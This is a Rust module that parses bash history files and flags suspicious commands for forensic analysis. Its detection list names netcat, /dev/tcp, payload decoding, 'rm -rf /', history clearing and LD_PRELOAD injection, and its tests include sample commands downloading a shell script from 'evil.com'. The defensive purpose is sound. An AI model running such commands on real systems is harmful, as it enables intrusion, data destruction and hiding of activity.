use serde::Serialize;

/// A parsed entry from a .bash_history file.
#[derive(Debug, Clone, Serialize)]
pub struct BashHistoryEntry {
    pub username: String,
    pub command: String,
    pub timestamp: Option<u64>,
    pub is_suspicious: bool,
}

/// Parse .bash_history file content into structured entries.
///
/// Lines starting with `#` followed by a Unix timestamp set the timestamp for
/// the next command. Other non-empty lines are commands. Blank lines are
/// skipped.
#[must_use]
pub fn parse_bash_history(content: &str, username: &str) -> Vec<BashHistoryEntry> {
    let mut results = Vec::new();
    let mut pending_timestamp: Option<u64> = None;

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        // Timestamp line: # followed immediately by digits
        if let Some(rest) = line.strip_prefix('#') {
            if let Ok(ts) = rest.trim().parse::<u64>() {
                pending_timestamp = Some(ts);
                continue;
            }
            // Other comment-like lines starting with # — skip
            continue;
        }

        // Command line
        let cmd = line.to_string();
        let is_suspicious = classify_bash_command(&cmd);
        results.push(BashHistoryEntry {
            username: username.to_string(),
            command: cmd,
            timestamp: pending_timestamp.take(),
            is_suspicious,
        });
    }

    results
}

/// Classify a bash command as suspicious or not.
///
/// Suspicious indicators include download tools, network utilities, payload
/// decoding, shell one-liners, anti-forensics, and `LD_PRELOAD` injection.
#[must_use]
pub fn classify_bash_command(cmd: &str) -> bool {
    let indicators = [
        "wget ",
        "curl ",
        "chmod +x",
        "chmod 777",
        "nc ",
        "ncat ",
        "nmap ",
        "/dev/tcp/",
        "/dev/udp/",
        "base64 -d",
        "base64 --decode",
        "python -c",
        "perl -e",
        "ruby -e",
        ">/dev/null 2>&1 &",
        "rm -rf /",
        "history -c",
        "unset HISTFILE",
        "LD_PRELOAD=",
    ];

    indicators.iter().any(|&indicator| cmd.contains(indicator))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_simple_commands() {
        let content = "ls -la\npwd\nwhoami\n";
        let entries = parse_bash_history(content, "alice");
        assert_eq!(entries.len(), 3);
        assert_eq!(entries[0].command, "ls -la");
        assert_eq!(entries[0].username, "alice");
        assert!(entries[0].timestamp.is_none());
    }

    #[test]
    fn parse_commands_with_timestamps() {
        let content =
            "#1712100000\nwget http://evil.com/shell.sh\n#1712100060\nchmod +x shell.sh\n";
        let entries = parse_bash_history(content, "root");
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].timestamp, Some(1_712_100_000));
        assert_eq!(entries[0].command, "wget http://evil.com/shell.sh");
        assert_eq!(entries[1].timestamp, Some(1_712_100_060));
        assert_eq!(entries[1].command, "chmod +x shell.sh");
    }

    #[test]
    fn parse_empty_file_returns_empty() {
        let entries = parse_bash_history("", "alice");
        assert!(entries.is_empty());
    }

    #[test]
    fn classify_wget_suspicious() {
        assert!(classify_bash_command("wget http://evil.com/shell.sh"));
        assert!(classify_bash_command("curl -o /tmp/x http://evil.com/x"));
    }

    #[test]
    fn classify_history_clear_suspicious() {
        assert!(classify_bash_command("history -c"));
        assert!(classify_bash_command("unset HISTFILE"));
    }

    #[test]
    fn classify_ls_not_suspicious() {
        assert!(!classify_bash_command("ls -la"));
        assert!(!classify_bash_command("cd /home/user"));
        assert!(!classify_bash_command("pwd"));
    }

    #[test]
    fn classify_ld_preload_suspicious() {
        assert!(classify_bash_command("LD_PRELOAD=/tmp/evil.so ./app"));
    }
}
